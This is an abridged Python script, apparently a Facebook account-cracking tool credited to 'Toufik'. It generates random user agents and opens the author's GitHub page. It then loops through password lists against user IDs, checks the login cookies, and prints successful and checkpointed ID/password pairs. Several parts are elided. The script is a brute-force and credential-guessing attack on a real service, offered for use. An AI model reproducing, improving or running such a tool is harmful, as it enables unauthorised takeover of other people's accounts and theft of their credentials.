#Create By: 𝙏𝙤𝙪𝙛𝙞𝙠
#FaceBook: 𝙏𝙤𝙪𝙛𝙞𝙠 𝙃𝙤𝙨𝙨𝙖𝙞𝙣 
#GitHub: https://github.com/𝙏𝙤𝙪𝙛𝙞𝙠-070
#---------------------------------------------------------------------------#
...
for xd in range(10000):
    ...
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
os.system('xdg-open https://github.com/Toufik-070')
logo = ("""\033[38;5;48m
 ______          ____ __  
/_  __/__  __ __/ _(_) /__
 / / / _ \/ // / _/ /  '_/
/_/  \___/\_,_/_//_/_/\_\   BOT🍁
\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\033[3;30m\033[2;37mFr\033[2;31mee \033[2;37mVers\033[2;36mi\033[2;37mon \033[2;34m0.1\x1b[0m
\033[38;5;96m\033[47m B \x1b[0m\033[38;5;196m DEVELOPER   :   𝙏𝙤𝙪𝙛𝙞𝙠 𝙓𝙉𝙓 
\033[38;5;97m\033[47m O \x1b[0m\033[38;5;197m GITHUB      :   𝙏𝙤𝙪𝙛𝙞𝙠-070
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r[\033[1;92mToufik \033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] - [CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[38;5;46m[Toufik-ok🌺] {uid} | {ps}")
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[Toufik-cp] {cid} | {ps}")
                ...
                continue
        loop+=1
        #sys.stdout.write(f'\r\033[m[TOUFIK ] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        #sys.stdout.flush()
    except:
        pass
Main()